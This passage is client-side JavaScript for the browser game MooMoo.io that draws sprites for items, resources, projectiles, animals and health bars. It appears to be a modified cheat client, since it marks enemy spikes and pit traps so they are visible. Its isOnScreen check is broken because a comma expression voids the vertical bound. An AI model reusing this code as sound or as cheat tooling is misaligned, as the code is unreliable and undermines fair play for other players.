                ctxt.rotate(owner.skinRot);
            ctxt.drawImage(tmpSkin, -(tmpObj.scale / 2), -(tmpObj.scale / 2), tmpObj.scale, tmpObj.scale);
            ctxt.restore();
        }
    }

    var accessSprites2 = {};
    var accessPointers2 = {};
    function renderTail2(index, ctxt, owner) {
        tmpSkin = accessSprites2[index];
        if (!tmpSkin) {
            var tmpImage = new Image();
            tmpImage.onload = function() {
                this.isLoaded = true;
                this.onload = null;
            };
            tmpImage.src = "https://moomoo.io/img/accessories/access_" + index + ".png";
            accessSprites2[index] = tmpImage;
            tmpSkin = tmpImage;
        }
        var tmpObj = accessPointers2[index];
        if (!tmpObj) {
            for (var i = 0; i < accessories.length; ++i) {
                if (accessories[i].id == index) {
                    tmpObj = accessories[i];
                    break;
                }
            }
            accessPointers2[index] = tmpObj;
        }
        if (tmpSkin.isLoaded) {
            ctxt.save();
            ctxt.translate(-20 - (tmpObj.xOff||0), 0);
            if (tmpObj.spin)
                ctxt.rotate(owner.skinRot);
            ctxt.drawImage(tmpSkin, -(tmpObj.scale/2), -(tmpObj.scale/2), tmpObj.scale, tmpObj.scale);
            ctxt.restore();
        }
    }

    // RENDER TOOL:
    let toolSprites = {};
    function renderTool(obj, variant, x, y, ctxt) {
        let tmpSrc = obj.src + (variant || "");
        let tmpSprite = toolSprites[tmpSrc];
        if (!tmpSprite) {
            tmpSprite = new Image();
            tmpSprite.onload = function() {
                this.isLoaded = true;
            }
            tmpSprite.src = "https://moomoo.io/img/weapons/" + tmpSrc + ".png";
            toolSprites[tmpSrc] = tmpSprite;
        }
        if (tmpSprite.isLoaded)
            ctxt.drawImage(tmpSprite, x + obj.xOff - (obj.length / 2), y + obj.yOff - (obj.width / 2), obj.length, obj.width);
    }

    // RENDER PROJECTILES:
    function renderProjectiles(layer, xOffset, yOffset) {
        for (let i = 0; i < projectiles.length; i++) {
            tmpObj = projectiles[i];
            if (tmpObj.active && tmpObj.layer == layer && tmpObj.inWindow) {
                tmpObj.update(delta);
                if (tmpObj.active && isOnScreen(tmpObj.x - xOffset, tmpObj.y - yOffset, tmpObj.scale)) {
                    mainContext.save();
                    mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
                    mainContext.rotate(tmpObj.dir);
                    renderProjectile(0, 0, tmpObj, mainContext, 1);
                    mainContext.restore();
                }
            }
        };
    }

    // RENDER PROJECTILE:
    let projectileSprites = {};//fz iz zexy

    function renderProjectile(x, y, obj, ctxt, debug) {
        if (obj.src) {
            let tmpSrc = items.projectiles[obj.indx].src;
            let tmpSprite = projectileSprites[tmpSrc];
            if (!tmpSprite) {
                tmpSprite = new Image();
                tmpSprite.onload = function() {
                    this.isLoaded = true;
                }
                tmpSprite.src = "https://moomoo.io/img/weapons/" + tmpSrc + ".png";
                projectileSprites[tmpSrc] = tmpSprite;
            }
            if (tmpSprite.isLoaded)
                ctxt.drawImage(tmpSprite, x - (obj.scale / 2), y - (obj.scale / 2), obj.scale, obj.scale);
        } else if (obj.indx == 1) {
            ctxt.fillStyle = "#939393";
            renderCircle(x, y, obj.scale, ctxt);
        }
    }

    // RENDER AI:
    let aiSprites = {};

    function renderAI(obj, ctxt) {
        let tmpIndx = obj.index;
        let tmpSprite = aiSprites[tmpIndx];
        if (!tmpSprite) {
            let tmpImg = new Image();
            tmpImg.onload = function() {
                this.isLoaded = true;
                this.onload = null;
            };
            tmpImg.src = "https://moomoo.io/img/animals/" + obj.src + ".png";
            tmpSprite = tmpImg;
            aiSprites[tmpIndx] = tmpSprite;
        }
        if (tmpSprite.isLoaded) {
            let tmpScale = obj.scale * 1.2 * (obj.spriteMlt || 1);
            ctxt.drawImage(tmpSprite, -tmpScale, -tmpScale, tmpScale * 2, tmpScale * 2);
        }
    }

    // RENDER WATER BODIES:
    function renderWaterBodies(xOffset, yOffset, ctxt, padding) {

        // MIDDLE RIVER:
        let tmpW = config.riverWidth + padding;
        let tmpY = (config.mapScale / 2) - yOffset - (tmpW / 2);
        if (tmpY < maxScreenHeight && tmpY + tmpW > 0) {
            ctxt.fillRect(0, tmpY, maxScreenWidth, tmpW);
        }
    }

    // RENDER GAME OBJECTS:
    let gameObjectSprites = {};

    function getResSprite(obj) {
        let biomeID = (obj.y >= config.mapScale - config.snowBiomeTop) ? 2 : ((obj.y <= config.snowBiomeTop) ? 1 : 0);
        let tmpIndex = (obj.type + "_" + obj.scale + "_" + biomeID);
        let tmpSprite = gameObjectSprites[tmpIndex];
        if (!tmpSprite) {
            let blurScale = 6;
            let tmpCanvas = document.createElement("canvas");
            tmpCanvas.width = tmpCanvas.height = (obj.scale * 2.1) + outlineWidth;
            let tmpContext = tmpCanvas.getContext('2d');
            tmpContext.translate((tmpCanvas.width / 2), (tmpCanvas.height / 2));
            tmpContext.rotate(UTILS.randFloat(0, Math.PI));
            tmpContext.strokeStyle = outlineColor;
            tmpContext.lineWidth = outlineWidth;
            // if (isNight) {
            //     tmpContext.shadowBlur = blurScale;
            //     tmpContext.shadowColor = `rgba(0, 0, 0, ${obj.alpha})`;
            // }
            if (obj.type == 0) {
                let tmpScale;
                let tmpCount = 8;
                tmpContext.globalAlpha = (cdf(obj, player) <= 250 ? 0.6 : 1);
                for (let i = 0; i < 2; ++i) {
                    tmpScale = tmpObj.scale * (!i ? 1 : 0.5);
                    renderStar(tmpContext, tmpCount, tmpScale, tmpScale * 0.7);
                    tmpContext.fillStyle = !biomeID ? (!i ? "#9ebf57" : "#b4db62") : (!i ? "#e3f1f4" : "#fff");
                    tmpContext.fill();
                    if (!i) {
                        tmpContext.stroke();
                        tmpContext.shadowBlur = null;
                        tmpContext.shadowColor = null;
                        tmpContext.globalAlpha = 1;
                    }
                }
            } else if (obj.type == 1) {
                if (biomeID == 2) {
                    tmpContext.fillStyle = "#606060";
                    renderStar(tmpContext, 6, obj.scale * 0.3, obj.scale * 0.71);
                    tmpContext.fill();
                    tmpContext.stroke();

                    //tmpContext.shadowBlur = null;
                    //tmpContext.shadowColor = null;

                    tmpContext.fillStyle = "#89a54c";
                    renderCircle(0, 0, obj.scale * 0.55, tmpContext);
                    tmpContext.fillStyle = "#a5c65b";
                    renderCircle(0, 0, obj.scale * 0.3, tmpContext, true);
                } else {
                    renderBlob(tmpContext, 6, tmpObj.scale, tmpObj.scale * 0.7);
                    tmpContext.fillStyle = biomeID ? "#e3f1f4" : "#89a54c";
                    tmpContext.fill();
                    tmpContext.stroke();

                    //tmpContext.shadowBlur = null;
                    //tmpContext.shadowColor = null;

                    tmpContext.fillStyle = biomeID ? "#6a64af" : "#c15555";
                    let tmpRange;
                    let berries = 4;
                    let rotVal = (Math.PI * 2) / berries;
                    for (let i = 0; i < berries; ++i) {
                        tmpRange = UTILS.randInt(tmpObj.scale / 3.5, tmpObj.scale / 2.3);
                        renderCircle(tmpRange * Math.cos(rotVal * i), tmpRange * Math.sin(rotVal * i),
                                     UTILS.randInt(10, 12), tmpContext);
                    }
                }
            } else if (obj.type == 2 || obj.type == 3) {
                tmpContext.fillStyle = (obj.type == 2) ? (biomeID == 2 ? "#938d77" : "#939393") : "#e0c655";
                renderStar(tmpContext, 3, obj.scale, obj.scale);
                tmpContext.fill();
                tmpContext.stroke();

                tmpContext.shadowBlur = null;
                tmpContext.shadowColor = null;

                tmpContext.fillStyle = (obj.type == 2) ? (biomeID == 2 ? "#b2ab90" : "#bcbcbc") : "#ebdca3";
                renderStar(tmpContext, 3, obj.scale * 0.55, obj.scale * 0.65);
                tmpContext.fill();
            }
            tmpSprite = tmpCanvas;
            gameObjectSprites[tmpIndex] = tmpSprite;
        }
        return tmpSprite;
    }

    // GET ITEM SPRITE:
    let itemSprites = [];

    function getItemSprite(obj, asIcon) {
        let tmpSprite = itemSprites[obj.id];
        if (!tmpSprite || asIcon) {
            let blurScale = !asIcon ? 20 : 5;
            let tmpCanvas = document.createElement("canvas");
            let reScale = ((!asIcon && obj.name == "windmill") ? items.list[4].scale : obj.scale);
            tmpCanvas.width = tmpCanvas.height = (reScale * 2.5) + outlineWidth + (items.list[obj.id].spritePadding || 0) + blurScale;

            let tmpContext = tmpCanvas.getContext("2d");
            tmpContext.translate((tmpCanvas.width / 2), (tmpCanvas.height / 2));
            tmpContext.rotate(asIcon ? 0 : (Math.PI / 2));
            tmpContext.strokeStyle = outlineColor;
            tmpContext.lineWidth = outlineWidth * (asIcon ? (tmpCanvas.width / 81) : 1);
            if (!asIcon) {
                tmpContext.shadowBlur = 8;
                tmpContext.shadowColor = `rgba(0, 0, 0, 0.2)`;
            }

            if (obj.name == "apple") {
                tmpContext.fillStyle = "#c15555";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fillStyle = "#89a54c";
                let leafDir = -(Math.PI / 2);
                renderLeaf(obj.scale * Math.cos(leafDir), obj.scale * Math.sin(leafDir),
                           25, leafDir + Math.PI / 2, tmpContext);
            } else if (obj.name == "cookie") {
                tmpContext.fillStyle = "#cca861";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fillStyle = "#937c4b";
                let chips = 4;
                let rotVal = (Math.PI * 2) / chips;
                let tmpRange;
                for (let i = 0; i < chips; ++i) {
                    tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
                    renderCircle(tmpRange * Math.cos(rotVal * i), tmpRange * Math.sin(rotVal * i),
                                 UTILS.randInt(4, 5), tmpContext, true);
                }
            } else if (obj.name == "cheese") {
                tmpContext.fillStyle = "#f4f3ac";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fillStyle = "#c3c28b";
                let chips = 4;
                let rotVal = (Math.PI * 2) / chips;
                let tmpRange;
                for (let i = 0; i < chips; ++i) {
                    tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
                    renderCircle(tmpRange * Math.cos(rotVal * i), tmpRange * Math.sin(rotVal * i),
                                 UTILS.randInt(4, 5), tmpContext, true);
                }
            } else if (obj.name == "wood wall" || obj.name == "stone wall" || obj.name == "castle wall") {
                tmpContext.fillStyle = (obj.name == "castle wall") ? "#83898e" : (obj.name == "wood wall") ?
                    "#a5974c" : "#939393";
                let sides = (obj.name == "castle wall") ? 4 : 3;
                renderStar(tmpContext, sides, obj.scale * 1.1, obj.scale * 1.1);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = (obj.name == "castle wall") ? "#9da4aa" : (obj.name == "wood wall") ?
                    "#c9b758" : "#bcbcbc";
                renderStar(tmpContext, sides, obj.scale * 0.65, obj.scale * 0.65);
                tmpContext.fill();
            } else if (obj.name == "spikes" || obj.name == "greater spikes" || obj.name == "poison spikes" ||
                       obj.name == "spinning spikes") {
                tmpContext.fillStyle = (obj.name == "poison spikes") ? "#7b935d" : "#939393";
                let tmpScale = (obj.scale * 0.6);
                renderStar(tmpContext, (obj.name == "spikes") ? 5 : 6, obj.scale, tmpScale);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#a5974c";
                renderCircle(0, 0, tmpScale, tmpContext);
                tmpContext.fillStyle = "#c9b758";
                renderCircle(0, 0, tmpScale / 2, tmpContext, true);
            } else if (obj.name == "windmill" || obj.name == "faster windmill" || obj.name == "power mill") {
                tmpContext.fillStyle = "#a5974c";
                renderCircle(0, 0, reScale, tmpContext);
                tmpContext.fillStyle = "#c9b758";
                renderRectCircle(0, 0, reScale * 1.5, 29, 4, tmpContext);
                tmpContext.fillStyle = "#a5974c";
                renderCircle(0, 0, reScale * 0.5, tmpContext);
            } else if (obj.name == "mine") {
                tmpContext.fillStyle = "#939393";
                renderStar(tmpContext, 3, obj.scale, obj.scale);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#bcbcbc";
                renderStar(tmpContext, 3, obj.scale * 0.55, obj.scale * 0.65);
                tmpContext.fill();
            } else if (obj.name == "sapling") {
                for (let i = 0; i < 2; ++i) {
                    let tmpScale = obj.scale * (!i ? 1 : 0.5);
                    renderStar(tmpContext, 7, tmpScale, tmpScale * 0.7);
                    tmpContext.fillStyle = (!i ? "#9ebf57" : "#b4db62");
                    tmpContext.fill();
                    if (!i) tmpContext.stroke();
                }
            } else if (obj.name == "pit trap") {
                tmpContext.fillStyle = "#a5974c";
                renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = outlineColor;
                renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
                tmpContext.fill();
            } else if (obj.name == "boost pad") {
                tmpContext.fillStyle = "#7e7f82";
                renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#dbd97d";
                renderTriangle(obj.scale * 1, tmpContext);
            } else if (obj.name == "turret") {
                tmpContext.fillStyle = "#a5974c";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#939393";
                let tmpLen = 50;
                renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
                renderCircle(0, 0, obj.scale * 0.6, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
            } else if (obj.name == "platform") {
                tmpContext.fillStyle = "#cebd5f";
                let tmpCount = 4;
                let tmpS = obj.scale * 2;
                let tmpW = tmpS / tmpCount;
                let tmpX = -(obj.scale / 2);
                for (let i = 0; i < tmpCount; ++i) {
                    renderRect(tmpX - (tmpW / 2), 0, tmpW, obj.scale * 2, tmpContext);
                    tmpContext.fill();
                    tmpContext.stroke();
                    tmpX += tmpS / tmpCount;
                }
            } else if (obj.name == "healing pad") {
                tmpContext.fillStyle = "#7e7f82";
                renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#db6e6e";
                renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
            } else if (obj.name == "spawn pad") {
                tmpContext.fillStyle = "#7e7f82";
                renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#71aad6";
                renderCircle(0, 0, obj.scale * 0.6, tmpContext);
            } else if (obj.name == "blocker") {
                tmpContext.fillStyle = "#7e7f82";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.rotate(Math.PI / 4);
                tmpContext.fillStyle = "#db6e6e";
                renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
            } else if (obj.name == "teleporter") {
                tmpContext.fillStyle = "#7e7f82";
                renderCircle(0, 0, obj.scale, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.rotate(Math.PI / 4);
                tmpContext.fillStyle = "#d76edb";
                renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
            }
            tmpSprite = tmpCanvas;
            if (!asIcon)
                itemSprites[obj.id] = tmpSprite;
        }
        return tmpSprite;
    }

    function getItemSprite2(obj, tmpX, tmpY) {
        let tmpContext = mainContext;
        let reScale = (obj.name == "windmill" ? items.list[4].scale : obj.scale);
        tmpContext.save();
        tmpContext.translate(tmpX, tmpY);
        tmpContext.rotate(obj.dir);
        tmpContext.strokeStyle = outlineColor;
        tmpContext.lineWidth = outlineWidth;
        if (obj.name == "apple") {
            tmpContext.fillStyle = "#c15555";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fillStyle = "#89a54c";
            let leafDir = -(Math.PI / 2);
            renderLeaf(obj.scale * Math.cos(leafDir), obj.scale * Math.sin(leafDir),
                       25, leafDir + Math.PI / 2, tmpContext);
        } else if (obj.name == "cookie") {
            tmpContext.fillStyle = "#cca861";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fillStyle = "#937c4b";
            let chips = 4;
            let rotVal = (Math.PI * 2) / chips;
            let tmpRange;
            for (let i = 0; i < chips; ++i) {
                tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
                renderCircle(tmpRange * Math.cos(rotVal * i), tmpRange * Math.sin(rotVal * i),
                             UTILS.randInt(4, 5), tmpContext, true);
            }
        } else if (obj.name == "cheese") {
            tmpContext.fillStyle = "#f4f3ac";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fillStyle = "#c3c28b";
            let chips = 4;
            let rotVal = (Math.PI * 2) / chips;
            let tmpRange;
            for (let i = 0; i < chips; ++i) {
                tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
                renderCircle(tmpRange * Math.cos(rotVal * i), tmpRange * Math.sin(rotVal * i),
                             UTILS.randInt(4, 5), tmpContext, true);
            }
        } else if (obj.name == "wood wall" || obj.name == "stone wall" || obj.name == "castle wall") {
            tmpContext.fillStyle = (obj.name == "castle wall") ? "#83898e" : (obj.name == "wood wall") ?
                "#a5974c" : "#939393";
            let sides = (obj.name == "castle wall") ? 4 : 3;
            renderStar(tmpContext, sides, obj.scale * 1.1, obj.scale * 1.1);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = (obj.name == "castle wall") ? "#9da4aa" : (obj.name == "wood wall") ?
                "#c9b758" : "#bcbcbc";
            renderStar(tmpContext, sides, obj.scale * 0.65, obj.scale * 0.65);
            tmpContext.fill();
        } else if (obj.name == "spikes" || obj.name == "greater spikes" || obj.name == "poison spikes" ||
                   obj.name == "spinning spikes") {
            tmpContext.fillStyle = (obj.name == "poison spikes") ? "#7b935d" : "#939393";
            let tmpScale = (obj.scale * 0.6);
            renderStar(tmpContext, (obj.name == "spikes") ? 5 : 6, obj.scale, tmpScale);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, tmpScale, tmpContext);
            tmpContext.fillStyle = "#c9b758";
            renderCircle(0, 0, tmpScale / 2, tmpContext, true);
        } else if (obj.name == "windmill" || obj.name == "faster windmill" || obj.name == "power mill") {
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, reScale, tmpContext);
            tmpContext.fillStyle = "#c9b758";
            renderRectCircle(0, 0, reScale * 1.5, 29, 4, tmpContext);
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, reScale * 0.5, tmpContext);
        } else if (obj.name == "mine") {
            tmpContext.fillStyle = "#939393";
            renderStar(tmpContext, 3, obj.scale, obj.scale);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#bcbcbc";
            renderStar(tmpContext, 3, obj.scale * 0.55, obj.scale * 0.65);
            tmpContext.fill();
        } else if (obj.name == "sapling") {
            for (let i = 0; i < 2; ++i) {
                let tmpScale = obj.scale * (!i ? 1 : 0.5);
                renderStar(tmpContext, 7, tmpScale, tmpScale * 0.7);
                tmpContext.fillStyle = (!i ? "#9ebf57" : "#b4db62");
                tmpContext.fill();
                if (!i) tmpContext.stroke();
            }
        } else if (obj.name == "pit trap") {
            tmpContext.fillStyle = "#a5974c";
            renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = outlineColor;
            renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
            tmpContext.fill();
        } else if (obj.name == "boost pad") {
            tmpContext.fillStyle = "#7e7f82";
            renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#dbd97d";
            renderTriangle(obj.scale * 1, tmpContext);
        } else if (obj.name == "turret") {
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#939393";
            let tmpLen = 50;
            renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
            renderCircle(0, 0, obj.scale * 0.6, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
        } else if (obj.name == "platform") {
            tmpContext.fillStyle = "#cebd5f";
            let tmpCount = 4;
            let tmpS = obj.scale * 2;
            let tmpW = tmpS / tmpCount;
            let tmpX = -(obj.scale / 2);
            for (let i = 0; i < tmpCount; ++i) {
                renderRect(tmpX - (tmpW / 2), 0, tmpW, obj.scale * 2, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpX += tmpS / tmpCount;
            }
        } else if (obj.name == "healing pad") {
            tmpContext.fillStyle = "#7e7f82";
            renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#db6e6e";
            renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
        } else if (obj.name == "spawn pad") {
            tmpContext.fillStyle = "#7e7f82";
            renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#71aad6";
            renderCircle(0, 0, obj.scale * 0.6, tmpContext);
        } else if (obj.name == "blocker") {
            tmpContext.fillStyle = "#7e7f82";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.rotate(Math.PI / 4);
            tmpContext.fillStyle = "#db6e6e";
            renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
        } else if (obj.name == "teleporter") {
            tmpContext.fillStyle = "#7e7f82";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.rotate(Math.PI / 4);
            tmpContext.fillStyle = "#d76edb";
            renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
        }
        tmpContext.restore();
    }

    let objSprites = [];

    function getObjSprite(obj) {
        let tmpSprite = objSprites[obj.id];
        if (!tmpSprite) {
            // let blurScale = isNight ? 20 : 0;
            let tmpCanvas = document.createElement("canvas");
            tmpCanvas.width = tmpCanvas.height = obj.scale * 2.5 + outlineWidth + (items.list[obj.id].spritePadding || 0) + 0;
            let tmpContext = tmpCanvas.getContext("2d");
            tmpContext.translate(tmpCanvas.width / 2, tmpCanvas.height / 2);
            tmpContext.rotate(Math.PI / 2);
            tmpContext.strokeStyle = outlineColor;
            tmpContext.lineWidth = outlineWidth;
            // if (isNight) {
            //     tmpContext.shadowBlur = 20;
            //     tmpContext.shadowColor = `rgba(0, 0, 0, ${Math.min(0.3, obj.alpha)})`;
            // }
            if (obj.name == "spikes" || obj.name == "greater spikes" || obj.name == "poison spikes" || obj.name == "spinning spikes") {
                tmpContext.fillStyle = obj.name == "poison spikes" ? "#7b935d" : "#939393";
                let tmpScale = obj.scale * 0.6;
                renderStar(tmpContext, obj.name == "spikes" ? 5 : 6, obj.scale, tmpScale);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#a5974c";
                renderCircle(0, 0, tmpScale, tmpContext);
                tmpContext.fillStyle = "#cc5151";
                renderCircle(0, 0, tmpScale / 2, tmpContext, true);
            } else if (obj.name == "pit trap") {
                tmpContext.fillStyle = "#a5974c";
                renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
                tmpContext.fill();
                tmpContext.stroke();
                tmpContext.fillStyle = "#cc5151";
                renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
                tmpContext.fill();
            }
            tmpSprite = tmpCanvas;
            objSprites[obj.id] = tmpSprite;
        }
        return tmpSprite;
    }

    // GET MARK SPRITE:
    function getMarkSprite(obj, tmpContext, tmpX, tmpY) {
        let center = {
            x: screenWidth / 2,
            y: screenHeight / 2,
        };
        tmpContext.lineWidth = outlineWidth;
        mainContext.globalAlpha = 0.2;
        tmpContext.strokeStyle = outlineColor;
        tmpContext.save();
        tmpContext.translate(tmpX, tmpY);
        tmpContext.rotate(90**10);
        if (obj.name == "spikes" || obj.name == "greater spikes" || obj.name == "poison spikes" || obj.name == "spinning spikes") {
            tmpContext.fillStyle = (obj.name == "poison spikes")?"#7b935d":"#939393";
            var tmpScale = (obj.scale);
            renderStar(tmpContext, (obj.name == "spikes")?5:6, obj.scale, tmpScale);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, tmpScale, tmpContext);
            if (player && obj.owner && player.sid != obj.owner.sid && !tmpObj.findAllianceBySid(obj.owner.sid)) {
                tmpContext.fillStyle = "#a34040";
            } else {
                tmpContext.fillStyle = "#c9b758";
            }
            renderCircle(0, 0, tmpScale/2, tmpContext, true);
        } else if (obj.name == "turret") {
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#939393";
            let tmpLen = 50;
            renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
            renderCircle(0, 0, obj.scale * 0.6, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
        } else if (obj.name == "teleporter") {
            tmpContext.fillStyle = "#7e7f82";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.rotate(Math.PI / 4);
            tmpContext.fillStyle = "#d76edb";
            renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
        } else if (obj.name == "platform") {
            tmpContext.fillStyle = "#cebd5f";
            let tmpCount = 4;
            let tmpS = obj.scale * 2;
            let tmpW = tmpS / tmpCount;
            let tmpX = -(obj.scale / 2);
            for (let i = 0; i < tmpCount; ++i) {
                renderRect(tmpX - (tmpW / 2), 0, tmpW, obj.scale * 2, tmpContext);
                tmpContext.fill();
                tmpContext.stroke();
                tmpX += tmpS / tmpCount;
            }
        } else if (obj.name == "healing pad") {
            tmpContext.fillStyle = "#7e7f82";
            renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#db6e6e";
            renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
        } else if (obj.name == "spawn pad") {
            tmpContext.fillStyle = "#7e7f82";
            renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.fillStyle = "#71aad6";
            renderCircle(0, 0, obj.scale * 0.6, tmpContext);
        } else if (obj.name == "blocker") {
            tmpContext.fillStyle = "#7e7f82";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fill();
            tmpContext.stroke();
            tmpContext.rotate(Math.PI / 4);
            tmpContext.fillStyle = "#db6e6e";
            renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
        } else if (obj.name == "windmill" || obj.name == "faster windmill" || obj.name == "power mill") {
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, obj.scale, tmpContext);
            tmpContext.fillStyle = "#c9b758";
            renderRectCircle(0, 0, obj.scale * 1.5, 29, 4, tmpContext);
            tmpContext.fillStyle = "#a5974c";
            renderCircle(0, 0, obj.scale * 0.5, tmpContext);

        } else if (obj.name == "pit trap") {
            tmpContext.fillStyle = "#a5974c";
            renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
            tmpContext.fill();
            tmpContext.stroke();
            if (player && obj.owner && player.sid != obj.owner.sid && !tmpObj.findAllianceBySid(obj.owner.sid)) {
                tmpContext.fillStyle = "#a34040";
            } else {
                tmpContext.fillStyle = outlineColor;
            }
            renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
            tmpContext.fill();
        }
        tmpContext.restore();
    }

    // OBJECT ON SCREEN:
    function isOnScreen(x, y, s) {
        return (x + s >= 0 && x - s <= maxScreenWidth && y + s >= 0 && (y,
                                                                        s,
                                                                        maxScreenHeight));
    }

    // RENDER GAME OBJECTS:
    function renderGameObjects(layer, xOffset, yOffset) {
        let tmpSprite;
        let tmpX;
        let tmpY;
        liztobj.forEach((tmp) => {
            tmpObj = tmp;
            if (tmpObj.active && liztobj.includes(tmp) && tmpObj.render) {
                tmpX = tmpObj.x + tmpObj.xWiggle - xOffset;
                tmpY = tmpObj.y + tmpObj.yWiggle - yOffset;
                if (layer == 0) {
                    tmpObj.update(delta);
                }
                mainContext.globalAlpha = tmpObj.alpha;
                if (tmpObj.layer == layer && isOnScreen(tmpX, tmpY, tmpObj.scale + (tmpObj.blocker || 0))) {
                    if (tmpObj.isItem) {
                        if ((tmpObj.dmg || tmpObj.trap) && !tmpObj.isTeamObject(player)) {
                            tmpSprite = getObjSprite(tmpObj);
                        } else {
                            tmpSprite = getItemSprite(tmpObj);
                        }

                        mainContext.save();
                        mainContext.translate(tmpX, tmpY);
                        mainContext.rotate(tmpObj.dir);
                        if (!tmpObj.active) {
                            mainContext.scale(tmpObj.visScale / tmpObj.scale, tmpObj.visScale / tmpObj.scale);
                        }
                        mainContext.drawImage(tmpSprite, -(tmpSprite.width / 2), -(tmpSprite.height / 2));

                        if (tmpObj.blocker) {
                            mainContext.strokeStyle = "#db6e6e";
                            mainContext.globalAlpha = 0.3;
                            mainContext.lineWidth = 6;
                            renderCircle(0, 0, tmpObj.blocker, mainContext, false, true);
                        }
                        mainContext.restore();
                    } else {
                        tmpSprite = getResSprite(tmpObj);
                        mainContext.drawImage(tmpSprite, tmpX - (tmpSprite.width / 2), tmpY - (tmpSprite.height / 2));
                    }
                }
                if (layer == 3 && !useWasd) {
                    if (tmpObj.health < tmpObj.maxHealth) {
                        // HEALTH HOLDER:
                        mainContext.fillStyle = darkOutlineColor;
                        mainContext.roundRect(tmpX - config.healthBarWidth / 2 - config.healthBarPad, tmpY - config.healthBarPad, config.healthBarWidth + config.healthBarPad * 2, 17, 8);
                        mainContext.fill();

                        // HEALTH BAR:
                        mainContext.fillStyle = tmpObj.isTeamObject(player) ? "#8ecc51" : "#cc5151";
